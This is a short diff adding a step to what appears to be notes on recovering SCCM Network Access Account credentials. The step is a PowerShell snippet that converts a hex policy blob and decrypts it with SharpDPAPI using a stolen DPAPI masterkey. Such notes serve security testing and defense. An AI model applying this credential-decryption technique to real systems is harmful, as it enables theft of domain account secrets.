@@ -72,3 +72,10 @@ function UnProtect-PolicySecret {
     return $([System.Text.UnicodeEncoding]::Unicode.GetString($bytePlainText))
 }
 ```
+If you have the masterkey and the NAA policy you can also decrypt with this:   
+```powershell
+$str = "<BLOB>"
+$bytes = for($i=0; $i -lt $str.Length; $i++) {[byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++}
+$b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
+SharpDPAPI.exe blob /target:$b64 /mkfile:<PATH TO FILE CONTAINING MASTERKEY GUID:SHA1 PAIR>
+```
